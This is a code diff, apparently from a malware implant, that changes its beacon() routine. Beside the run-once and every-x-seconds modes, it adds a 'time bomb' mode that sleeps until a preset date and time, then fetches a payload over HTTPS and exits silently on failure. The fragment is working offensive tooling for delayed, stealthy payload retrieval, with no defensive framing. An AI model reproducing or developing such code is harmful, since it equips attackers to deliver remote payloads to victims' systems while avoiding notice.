@@ -75,7 +75,7 @@ struct MemoryStruct beacon()
 {
     struct MemoryStruct payload;
 
-    if (BEACON_MODE <= 0)
+    if (BEACON_MODE == 0) // beacon instantly once
     {
         payload = getHTTPS();
         if (payload.memory == NULL)
@@ -83,8 +83,21 @@ struct MemoryStruct beacon()
             exit(0); // if file not obtained and set to only beacon once, exit immediately
         }
     }
-    else
-    { // beacon every x seconds
+    else if (BEACON_MODE == -1) // time bomb beacon
+    {
+        if (BEACON_DATE_TIME > time(NULL)) // beacon date/time not reached yet, sleep
+        {
+            sleep(BEACON_DATE_TIME - time(NULL));
+        }
+        
+        payload = getHTTPS();
+        if (payload.memory == NULL)
+        {            // error condition
+            exit(0);
+        }
+    }
+    else // beacon every x seconds
+    { 
         while (1)
         {
             sleep(BEACON_MODE);
